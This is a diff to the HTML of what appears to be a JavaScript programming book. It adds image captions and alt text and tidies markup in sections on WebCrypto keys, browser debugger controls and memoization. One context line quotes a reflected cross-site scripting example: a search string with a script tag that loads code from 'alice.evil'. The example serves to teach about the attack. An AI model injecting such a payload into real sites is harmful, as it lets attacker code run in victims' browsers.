@@ -25015,14 +25015,14 @@ change prefix and suffix to:</p>
 <pre>
 </pre>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~ 45.  (419) ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
+<!--~~~~~~~~~~ 45. function removeLines, base64ToArrayBuffer, pemToArrayBuffer (419) ~~~~~~~~~~~-->
 <p align="left">
   <img src="./images/image045.png"
-  title="."
-  alt="."
+  title="Functions removeLines, base64ToArrayBuffer, pemToArrayBuffer"
+  alt="Functions removeLines, base64ToArrayBuffer, pemToArrayBuffer."
   style="border: 2px solid #000000; width:7.48in;" />
-<!-- ![](./images/image045.png){width="7.486805555555556in"
-height="6.270138888888889in"} -->
+</p>
+<!-- ![](./images/image045.png){width="7.486805555555556in" height="6.270138888888889in"} -->
 
 <!-- page 420 -->
 <p>And now you&apos;re done! You can use your imported key in WebCrypto API.</p>
@@ -25078,12 +25078,13 @@ Your search (), didn&apos;t match anything. Try again.
 
 <p>And:</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~ 46.  (419) ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
+<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 46. example.com says: 1 (419) ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p align="left">
   <img src="./images/image046.png"
-  title="."
-  alt="."
-  style="border: 2px solid #000000; width:4.5in;" />
+  title="Example.com says: 1"
+  alt="Example.com says: 1."
+  style="border: 2px solid #000000; width:4.58in;" />
+</p>
 <!-- ![](./images/image046.png){width="4.585416666666666in" height="1.4868055555555555in"} -->
 <p>Than Alice searches for <b>&lt;script</b> src = &quot;https://alice.evil/puppy_xss.js&gt;&lt;/script&gt;really cute puppies
 , and copies the link in her address bar, and then emails Bob:</p>
@@ -25990,12 +25991,13 @@ browser&apos;s dev tools. These help in skipping unnecessary breaks in
 execution. Example scenario: you want to examine a variable in a loop
 exactly at 5th iteration.</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~ 47.  (419) ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
+<!--~~~~~~~~~~~~~~ 47. examine variable in loop at 5th iteration (n===5) (419) ~~~~~~~~~~~~~~~~~-->
 <p align="left">
   <img src="./images/image047.jpg"
-  title="."
-  alt="."
+  title="Examine variable in loop at 5th iteration (n===5)"
+  alt="Examine variable in loop at 5th iteration (n===5)."
   style="border: 2px solid #000000; width:4.2in;" />
+</p>
 <!-- ![](./images/image047.jpg){width="4.288194444444445in" height="0.8736111111111111in"} -->
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch99-3">Section 99.3: Using setters and getters to find what changed a property</h3>
@@ -26095,15 +26097,14 @@ opened:</p>
 <p>In Google Chrome, you can pause execution without needing to place
 breakpoints.</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~ 48.  (438) ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
+<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~ 48. pause button (438) ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p align="left">
   <img src="./images/image048.jpg"
-  title="."
-  alt="."
-  style="border: 2px solid #000000; width:.2in;" />
+  title="Pause button"
+  alt="Pause button."
+  style="width:0.225in;" />
 <!-- ![](./images/image048.jpg){width="0.225in" height="0.225in"} -->
-
-<p><b>Pause on Exception:</b> While this button is toggled on, if your
+<b>Pause on Exception:</b> While this button is toggled on, if your
 program hits an unhandled exception, the program will pause as if it
 had hit a breakpoint. The button can be found near Execution Controls
 and is useful for locating errors.</p>
@@ -26115,14 +26116,14 @@ node on the Elements tab and select &quot;Break on&hellip;&quot;.</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>Clicking the</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~ 49.  (419) ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
+<!--~~~~~~~~~~~~~~~~~~~~~~~ 49. arrow pointing northwest into box (419) ~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p align="left">
   <img src="./images/image049.jpg"
-  title="."
-  alt="."
-  style="border: 2px solid #000000; width:.2in;" />
+  title="Arrow for select an element in the page to inspect"
+  alt="Arrow for select an element in the page to inspect."
+  style="width:.215in;" />
 <!-- ![](./images/image049.jpg){width="0.21597222222222223in" height="0.21597222222222223in"} -->
-<p><i>Select an element in the page to
+<i>Select an element in the page to
 inspect it</i> button in the upper left corner of the Elements tab in
 Chrome or Inspector tab in Firefox, available from Developer Tools,
 and then clicking on an element of the page highlights the element and
@@ -26159,45 +26160,45 @@ Developer Tools and look for the Execution Control icons. (This
 example uses the icons in Google Chrome, but they&apos;ll be similar in
 other browsers.)</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~ 50.  (439) ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
+<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 50. resume, arrow right (439) ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p align="left">
   <img src="./images/image050.jpg"
-  title="."
-  alt="."
-  style="border: 2px solid #000000; width:.2in;" />
+  title="Resume, arrow right"
+  alt="Resume, arrow right."
+  style="width:0.215in;" />
 <!-- ![](./images/image050.jpg){width="0.21597222222222223in" height="0.19791666666666666in"} -->
-<p><b>Resume:</b> Unpause execution. Shorcut: F8 (Chrome, Firefox)</p>
+<b>Resume:</b> Unpause execution. Shorcut: F8 (Chrome, Firefox)</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~ 51.  (439) ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
+<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 51. clockwise arrow, period (439) ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p align="left">
   <img src="./images/image051.jpg"
-  title="."
-  alt="."
-  style="border: 2px solid #000000; width:.2in;" />
+  title="Clockwise arrow, period"
+  alt="Clockwise arrow, period."
+  style="width:0.261in; height:0.188" />
 <!-- ![](./images/image051.jpg){width="0.2611111111111111in" height="0.18888888888888888in"} -->
-<p><b>Step Over:</b> Run the next line of
+<b>Step Over:</b> Run the next line of
 code. If that line contains a function call, run the whole function
 and move to the next line, rather than jumping to wherever the
 function is defined. Shortcut : F10 (Chrome, Firefox, IE/Edge), (Safari)</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~ 52.  (439) ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
+<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 52. arrow down, period (439) ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p align="left">
   <img src="./images/image052.jpg"
-  title="."
-  alt="."
-  style="border: 2px solid #000000; width:.19in;" />
+  title="Arrow pointing down, period"
+  alt="Arrow pointing down, period."
+  style="width:0.197in; height:0.206in;" />
 <!-- ![](./images/image052.jpg){width="0.19791666666666666in" height="0.20694444444444443in"} -->
-<p><b>Step Into:</b> Run the next line of code. If that line contains a function call, 
+<b>Step Into:</b> Run the next line of code. If that line contains a function call, 
 jump into the function and pause there. Shortcut : F11 (Chrome, Firefox, IE/Edge), F7 (Safari)</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~ 52.  (439) ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
+<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 53. period, arrow up (439) ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p align="left">
   <img src="./images/image053.jpg"
-  title="."
-  alt="."
-  style="border: 2px solid #000000; width:.19in;" />
+  title="Period, arrow pointing up"
+  alt="Period, arrow pointing up."
+  style="width:0.1979in; height:0.2069in;" />
 <!-- ![](./images/image053.jpg){width="0.19791666666666666in" height="0.20694444444444443in"} -->
-<p><b>Step Out:</b> Run the rest of the current function, jump back to where the function 
+<b>Step Out:</b> Run the rest of the current function, jump back to where the function 
 was called from, and pause at the next statement there. Shortcut : Shift + F11 (Chrome, 
 Firefox, IE/Edge), F8 (Safari)</p>
 <p>Use these in conjunction with the <b>Call Stack</b>, which will tell you
@@ -26966,13 +26967,13 @@ that! Let&apos;s create a memoizer, shall we?</p>
 
 <p>Now we can start using it:</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~ 54.  (4xx) ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
+<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 54. 100 factorial function (4xx) ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p align="left">
   <img src="./images/image054.jpg"
-  title="."
-  alt="."
+  title="Function calculates 100 factorial."
+  alt="Function calculates 100 factorial."
   style="border: 2px solid #000000; width:4.25in;" />
-<!-- {width="4.252083333333333in" height="0.9909722222222223in"} -->
+</p>
 <p>Now that I start to reflect on what I did, if I were to increment from
 1 instead of decrement from <i>num</i>, I could have cached all of the
 factorials from 1 to <i>num</i> in the cache recursively, but I will leave
@@ -27064,13 +27065,15 @@ array always processes better even if it&apos;s doing extra statement.</p>
 </pre>
 <!-- page 454 -->
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<!--~~~~~~~~~~~~~~~~~~~~~~~~~ 55. functions f1, f1 & perform() (454) ~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
+<!--~~~~~~~~~~~~~~~~~~~~~~~~~ 55. functions f1, f2 & perform() (454) ~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p align="left">
   <img src="./images/image055.png"
   title="Functions f1(), f2(), &amp; perform()."
   alt="Functions f1(), f2(), &amp; perform()."
-  style="border: 2px solid #000000; width:7.072in;" />
+  style="width:7.486in;" />
+</p>
 <!-- {width="7.486805555555556in" height="7.072222222222222in"} -->
+
 <p>This is the result for Chrome and Firefox.</p>
 
 <table border="0" style="width:200px">
